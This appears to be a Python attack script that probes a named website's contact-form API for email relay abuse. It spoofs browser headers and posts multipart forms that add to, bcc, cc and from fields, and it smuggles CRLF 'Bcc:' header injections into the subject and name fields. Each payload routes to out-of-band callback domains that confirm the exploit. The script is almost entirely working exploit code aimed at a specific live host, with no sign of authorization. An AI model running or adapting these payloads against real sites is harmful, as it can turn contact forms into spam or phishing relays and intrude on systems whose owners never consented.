import subprocess, urllib.parse, json, time, os, sys
H = ".".join(["www","infinitycapital","bh"])
B = "https://" + H
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
LOG = open("/work/atk6.log","a")
BCC = "oob91397ee33ce1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
TO  = "oob542886f1504a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CRLF= "oob299350dcd31a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

# Build a real multipart/form-data body (what the browser actually sends)
def multipart(fields):
    bd = "----atk6" + "0"*16
    parts = []
    for k,v in fields:
        parts.append("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (bd,k,v))
    body = "".join(parts) + "--%s--\r\n" % bd
    return body, "multipart/form-data; boundary=%s" % bd

def send_mp(fields, referer=None, timeout=30):
    body, ct = multipart(fields)
    cmd = ["curl","-sk","-X","POST","-A",UA,"-D","/tmp/a6.h","-o","/tmp/a6.bin","-w","%{time_total}"]
    if referer: cmd += ["-H","Referer: "+referer]
    cmd += ["-H","Content-Type: "+ct,"-H","Origin: "+B,"--data-binary",body, B+"/api/send"]
    r = subprocess.run(cmd, capture_output=True, text=True)
    bb = open("/tmp/a6.bin","rb").read()
    return float(r.stdout or 0), open("/tmp/a6.h").read().split("\n")[0].strip(), bb

def classify(body):
    try: j=json.loads(body)
    except Exception:
        return "RATE429" if b"Too Many" in body else "OTHER:%r"%body[:70]
    if j.get("error"):
        n=j["error"].get("name","")
        return "QUOTA" if n=="monthly_quota_exceeded" else ("VALID" if n=="validation_error" else "ERR:"+str(j["error"].get("message"))[:60])
    if j.get("data") and isinstance(j["data"],dict) and j["data"].get("id"): return "OK:"+j["data"]["id"][:8]
    return "DATA:"+str(j.get("data"))[:50]

def logit(*a):
    s=" ".join(str(x) for x in a); print(s); LOG.write(s+"\n"); LOG.flush()

def BASE(extra=None, **over):
    f = [("fname","Test"),("lname","QA"),("areacode","973"),("tel","5551234"),
         ("cname","QA Tester"),("subject","Hello there"),("msg","Testing body"),
         ("check","on"),("targets","")]
    for k,v in over.items():
        f = [(kk,vv) for kk,vv in f if kk!=k]
        f.append((k,v))
    if extra: f += extra
    return f

def test(label, fields, n=2):
    for i in range(n):
        t,st,bb = send_mp(fields, referer=B+"/contact")
        logit("%-34s #%d tt=%.2f %s -> %s"%(label,i,t,st,classify(bb)))
        time.sleep(4)
        if classify(bb).startswith("OK"): return True
    return False

if __name__ == "__main__":
    w = sys.argv[1] if len(sys.argv)>1 else "all"
    if w in ("all","ma"):
        logit("\n===== MASS ASSIGNMENT / RELAY (multipart)  %s ====="%time.strftime("%H:%M:%S"))
        test("baseline-control", BASE())
        test("add to=oob",  BASE(extra=[("to","probe@"+TO)]))
        test("add bcc=oob", BASE(extra=[("bcc","probe@"+BCC)]))
        test("add cc=oob",  BASE(extra=[("cc","probe@"+BCC)]))
        test("add from=oob",BASE(extra=[("from","probe@"+BCC)]))
        test("add replyTo",  BASE(extra=[("replyTo","probe@"+BCC)]))
        test("add recipient",BASE(extra=[("recipient","probe@"+BCC)]))
        test("add targets=oob", BASE(targets="probe@"+BCC))
    if w in ("all","crlf"):
        logit("\n===== CRLF / HEADER INJECTION  %s ====="%time.strftime("%H:%M:%S"))
        test("CRLF in subject", BASE(subject="Hi\r\nBcc: probe@"+CRLF))
        test("CRLF in cname",   BASE(cname="QA\r\nBcc: probe@"+CRLF))
        test("CRLF in fname",   BASE(fname="A\r\nBcc: probe@"+CRLF))
        test("LF-only in msg",  BASE(msg="x\nBcc: probe@"+CRLF))
